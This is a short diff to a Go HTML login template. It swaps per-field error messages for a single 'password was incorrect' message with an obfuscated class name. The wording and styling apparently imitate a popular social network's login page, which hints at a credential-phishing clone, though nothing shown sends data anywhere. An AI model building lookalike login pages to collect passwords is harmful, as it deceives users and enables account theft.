@@ -8,15 +8,12 @@
         </div>
         <br />
         <form class="container" action="/Login" method="post">
-            <input type="text" placeholder="Phone number, username, or email" name="u_name" class="{{if .InvalidUsername}}error{{end}}">
-            {{if .InvalidUsername}}
-                <div class="error-message">Username is incorrect.</div>
-            {{end}}
-            <input type="password" placeholder="Password" name="pass" class="{{if .InvalidPassword}}error{{end}}">
-            {{if .InvalidPassword}}
-                <div class="error-message">Password is incorrect.</div>
-            {{end}}
+            <input type="text" placeholder="Phone number, username, or email" name="u_name">
+            <input type="password" placeholder="Password" name="pass">
             <button class="submitbutton">Log in</button>
+            {{if .InvalidUsername}}
+            <div class="_ab2z">Sorry, your password was incorrect. Please double-check your password.</div>
+            {{end}}
             <br />
             <div class="option">OR</div>
         </form>
